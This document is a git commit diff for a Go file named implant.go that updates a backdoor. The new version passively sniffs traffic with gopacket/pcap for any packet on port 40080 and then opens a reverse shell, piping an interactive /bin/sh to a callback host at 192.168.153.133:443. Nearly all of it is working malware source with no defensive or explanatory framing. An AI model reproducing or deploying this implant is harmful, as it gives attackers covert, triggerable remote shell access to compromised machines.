8ba4da04a79ae02ce9dce55ff59f1e8b4bc1c90f
quesadilla <debian.dave@pm.me>
2024-07-06 08:02:05 -1000

    updated implant to trigger on port using gopacket

--- implant.go
+++ implant.go
@@ -1,46 +1,80 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"net"
 	"os/exec"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/pcap"
 )
 
 const (
 	CONN_HOST = "192.168.153.133"
 	CONN_PORT = "443"
 	CONN_TYPE = "tcp"
+
+	//configure the gopacket input
+	FILTER    = "tcp and port 40080"
+	SNAPLEN   = int32(1600)
+	PROMISC   = false
+	INTERFACE = "any"
+	TIMEOUT   = pcap.BlockForever
 )
 
-func handle(conn net.Conn) {
+// decrease network traffic using singleton
+var ATTEMPTSHELL = true
 
+func genRevShell() {
 	revConn, err := net.Dial(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
 	if err != nil {
-		log.Fatalln(err)
+		fmt.Println(err)
+	} else {
+		defer revConn.Close()
+
+		shell := exec.Command("/bin/sh", "-i")
+
+		shell.Stderr = revConn
+		shell.Stdin = revConn
+		shell.Stdout = revConn
+
+		shell.Run()
 	}
-	defer revConn.Close()
-
-	shell := exec.Command("/bin/sh", "-i")
-
-	shell.Stderr = revConn
-	shell.Stdin = revConn
-	shell.Stdout = revConn
-
-	conn.Close()
-	shell.Run()
+	ATTEMPTSHELL = true
 }
 
 func main() {
-	listener, err := net.Listen("tcp", ":40080")
+
+	devices, err := pcap.FindAllDevs()
 	if err != nil {
-		log.Fatalln(err)
+		log.Panicln(err)
+	}
+
+	for _, device := range devices {
+		println("Found" + device.Name)
+	}
+
+	listener, err := pcap.OpenLive(INTERFACE, SNAPLEN, PROMISC, TIMEOUT)
+	if err != nil {
+		log.Panicln(err)
+	}
+
+	defer listener.Close()
+
+	if err := listener.SetBPFFilter(FILTER); err != nil {
+		log.Panicln(err)
 	}
 
 	for {
-		conn, err := listener.Accept()
-		if err != nil {
-			log.Fatalln(err)
+		source := gopacket.NewPacketSource(listener, listener.LinkType())
+		if source != nil {
+			fmt.Println(source.Packets())
+			for packet := range source.Packets() {
+				if ATTEMPTSHELL == true && packet.Data() != nil {
+					genRevShell()
+				}
+			}
 		}
-		go handle(conn)
 	}
 }
